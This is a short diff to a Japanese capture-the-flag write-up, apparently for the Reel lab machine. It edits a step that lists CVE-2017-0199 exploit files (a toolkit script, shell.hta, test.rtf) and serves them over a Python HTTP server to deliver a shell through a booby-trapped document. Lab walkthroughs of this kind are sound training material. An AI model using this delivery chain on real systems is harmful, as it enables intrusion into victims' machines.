@@ -116,11 +116,7 @@ Revision Number                 : 4
 ```
 
 shell.htaとtest.rtfがあるディレクトリ上でHTTPサーバをたてる：
-```
-┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
-└─$ ls
-cve-2017-0199_toolkit.py  shell.hta  template  test.rtf
-                                                                                                          
+```                                                 
 ┌──(shoebill㉿shoebill)-[~/Reel_10.10.10.77/CVE-2017-0199]
 └─$ python3 -m http.server   
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
